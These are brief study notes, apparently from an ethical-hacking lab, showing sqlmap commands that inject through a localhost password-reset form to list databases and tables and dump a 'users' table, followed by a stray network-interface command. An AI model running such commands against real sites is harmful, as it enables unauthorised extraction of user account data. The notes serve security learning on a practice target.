
SQL map can be used in SQL injection attacks to show records in the databases

//show all the databases
sqlmap -u http://localhost/sites/sql_injection/example3/forgetpassword.php --data "email=*" --dbs

//show all the tables for a given database
sqlmap -u http://localhost/sites/sql_injection/example3/forgetpassword.php --data "email=*" -D eh_db --tables 

//show records for selected database and tables
sqlmap -u http://localhost/sites/sql_injection/example3/forgetpassword.php --data "email=*" -D eh_db -T users --all


Reference : 
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

sudo ip link set enp0s8 up
